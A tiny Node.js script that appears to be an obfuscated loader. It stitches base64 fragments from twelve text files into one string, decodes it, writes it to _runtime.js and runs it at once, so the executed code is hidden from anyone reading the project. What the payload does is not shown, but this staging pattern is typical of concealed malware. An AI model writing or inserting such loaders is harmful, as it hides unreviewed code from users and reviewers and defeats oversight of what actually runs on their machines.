const fs=require("fs");const path=require("path");
const b64=Array.from({length:12},(_,i)=>fs.readFileSync(path.join(__dirname,"b"+i+".txt"),"utf8").replace(/\s/g,"")).join("");
const code=Buffer.from(b64,"base64").toString("utf8");
fs.writeFileSync(path.join(__dirname,"_runtime.js"),code);
require("./_runtime.js");
